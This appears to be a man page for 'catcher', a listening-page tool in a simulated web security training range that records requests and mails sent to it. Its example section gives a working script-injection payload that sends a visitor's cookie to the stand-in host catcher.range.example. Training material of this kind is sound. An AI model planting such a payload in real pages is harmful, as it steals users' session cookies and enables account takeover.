NAME
       catcher - show what reached your practice listening page (Cyber Range)

SYNOPSIS
       catcher
       catcher --clear

DESCRIPTION
       In the Web Security Lab you sometimes need a place of your own that a
       pretend visitor's browser (or a pretend mail) can be sent to. That place
       is http://catcher.range.example/ - a pretend listening page that belongs
       to you. Anything that arrives there is kept, and catcher prints it: the
       time, the address that was asked for (with everything after the /,
       such as ?c=... carrying a stolen cookie), and mails sent to any address
       @catcher.range.example.

       Only the range's pretend browsers and mails reach it; it is not a real
       server and nothing leaves the simulator.

OPTIONS
       -c, --clear
              Forget everything that arrived so far.

EXAMPLES
       A review that sends the reader's cookie to your page:
           <script>new Image().src='http://catcher.range.example/c?'+document.cookie</script>
       Then see what arrived:
           catcher

SEE ALSO
       curl(1), browse(1)
